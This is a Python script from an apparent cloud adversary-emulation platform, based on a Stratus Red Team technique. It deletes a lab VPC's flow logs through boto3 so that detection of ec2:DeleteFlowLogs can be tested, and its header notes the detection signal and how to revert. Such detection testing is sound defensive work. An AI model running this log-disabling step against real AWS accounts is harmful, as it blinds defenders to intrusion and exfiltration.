"""
Technique : aws.defense-evasion.vpc-remove-flow-logs
Tactic    : Defense Evasion (T1562.008 - Impair Defenses: Disable or Modify Cloud Logs)
Source    : https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.vpc-remove-flow-logs/

How the attack works:
  An attacker with ec2:DeleteFlowLogs removes a VPC's flow log configuration to
  eliminate network traffic visibility, blinding detection of lateral movement,
  data exfiltration, and C2 traffic.

Detection signal:
  - ec2:DeleteFlowLogs in CloudTrail. Removal of network visibility is a
    high-confidence defense evasion indicator.

Revert:
  - Not reversible from the attack. `pulumi up` recreates the flow log; the
    Pulumi refresh on the next deploy restores state.

Backend contract:
  run(outputs: dict, region: str = "us-east-1") -> None
  Reads `flow_log_id` / `vpc_id` from the Pulumi stack outputs.
"""

import sys
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]

import boto3
from botocore.exceptions import ClientError


def _bootstrap_session(outputs: dict, region: str):
    """Session for the attack. In the MayaTrail backend the worker injects the
    tenant's short-lived assumed-role credentials as outputs['_aws_credentials'];
    use them so the attack runs in the tenant account. Falls back to the ambient
    default session for standalone runs."""
    creds = (outputs or {}).get("_aws_credentials")
    if creds:
        return boto3.Session(
            aws_access_key_id=creds.get("AWS_ACCESS_KEY_ID"),
            aws_secret_access_key=creds.get("AWS_SECRET_ACCESS_KEY"),
            aws_session_token=creds.get("AWS_SESSION_TOKEN"),
            region_name=region,
        )
    return boto3.Session(region_name=region)


def banner(msg: str) -> None:
    print(f"\n{'=' * 60}\n  {msg}\n{'=' * 60}")


def run(outputs: dict, region: str = "us-east-1") -> None:
    flow_log_id = (outputs or {}).get("flow_log_id", "")
    vpc_id = (outputs or {}).get("vpc_id", "")
    if not flow_log_id:
        raise RuntimeError("Missing required Pulumi output: flow_log_id")

    ec2_client = _bootstrap_session(outputs, region).client("ec2", region_name=region)

    # ── Step 1: Delete the VPC flow log ─────────────────────────────────────
    banner("Step 1 - Delete VPC flow log (DeleteFlowLogs)")
    try:
        response = ec2_client.delete_flow_logs(FlowLogIds=[flow_log_id])
        unsuccessful = response.get("Unsuccessful", [])
        if unsuccessful:
            for item in unsuccessful:
                print(f"  [!] Failed to delete {item.get('ResourceId')}: "
                      f"{item.get('Error', {}).get('Message')}")
            raise RuntimeError(f"DeleteFlowLogs reported failures: {unsuccessful}")
        print(f"  [+] Flow log deleted: {flow_log_id}")
        print(f"  [+] VPC: {vpc_id}")
        print("  [!] CloudTrail event: ec2:DeleteFlowLogs")
        print("  [!] Network traffic logging is now DISABLED for this VPC.")
    except ClientError as exc:
        print(f"  [!] DeleteFlowLogs failed: {exc}")
        raise

    banner("Complete")
    print("CloudTrail event generated: ec2:DeleteFlowLogs")
